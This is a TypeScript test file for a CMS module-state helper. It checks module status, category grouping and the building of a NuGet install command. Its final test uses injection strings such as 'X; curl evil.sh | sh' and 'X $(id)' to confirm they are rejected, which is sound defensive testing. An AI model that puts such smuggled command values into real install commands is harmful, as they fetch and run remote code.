import { describe, it, expect } from 'vitest';
import { groupByCategory, installLine, moduleState } from './module-state';
import type { ModuleSummary } from '@/types/modules';

const m = (name: string, extra: Partial<ModuleSummary> = {}): ModuleSummary => ({
    name,
    contractVersion: 1,
    enabled: true,
    schemaState: 'ready',
    schemaChanges: [],
    ...extra,
});

describe('module state', () => {
    it('reads three states, not two', () => {
        expect(moduleState(m('A'))).toBe('enabled');
        expect(moduleState(m('A', { enabled: false }))).toBe('installed');
        expect(moduleState(m('A', { enabled: false, installed: false }))).toBe('not-installed');
    });

    it('groups by category with uncategorised modules last', () => {
        const groups = groupByCategory([
            m('Zed', { category: 'Content' }),
            m('Plain'),
            m('Alpha', { category: 'Content' }),
            m('Mail', { category: 'Messaging' }),
        ]);
        expect(groups.map((g) => g.category)).toEqual(['Content', 'Messaging', 'Other']);
        expect(groups[0].modules.map((x) => x.name)).toEqual(['Alpha', 'Zed']);
    });

    it('builds the install line from the package, and none without one', () => {
        expect(installLine({ package: 'BarakoCMS.Files' })).toBe('dotnet add package BarakoCMS.Files');
        expect(installLine({})).toBeNull();
    });

    it('gives no install line for a package value that is not a plain NuGet id', () => {
        expect(installLine({ package: 'X; curl evil.sh | sh' })).toBeNull();
        expect(installLine({ package: 'X $(id)' })).toBeNull();
        expect(installLine({ package: '--source http://evil' })).toBeNull();
    });
});
